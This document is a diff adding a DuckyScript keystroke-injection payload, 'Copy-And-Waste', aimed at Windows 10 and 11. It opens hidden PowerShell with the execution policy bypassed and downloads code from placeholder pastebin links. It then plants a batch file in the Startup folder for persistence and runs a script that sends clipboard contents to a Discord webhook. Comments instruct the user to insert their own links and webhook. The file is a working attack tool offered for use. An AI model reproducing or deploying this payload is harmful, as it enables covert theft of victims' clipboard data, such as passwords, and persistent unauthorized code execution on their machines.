@@ -1,0 +1,17 @@
+REM     Title: Copy-And-Waste
+
+REM     Author: atomiczsec & I am Jakoby
+
+REM     Description: This payload is meant to exfiltrate whatever is copied to the clipboard and sends to a discord webhook
+
+REM     Target: Windows 10, 11
+
+DELAY 2000
+GUI
+DELAY
+STRING powershell -w h -NoP -NonI -Ep Bypass "echo (iwr PASTEBIN LINK FOR BAT).content > "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\l.bat";echo (iwr PASTEBIN LINK FOR PS1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1"" 
+ENTER
+
+REM     Remember to replace the link with your pastebin shared link for the intended files to download
+REM     Also remember to put in your discord webhook in c.ps1
+REM     For the PASTEBIN LINK's do not put https:// infront of it, it should look like pastebin.com/raw/BLAHBLAHBLAH
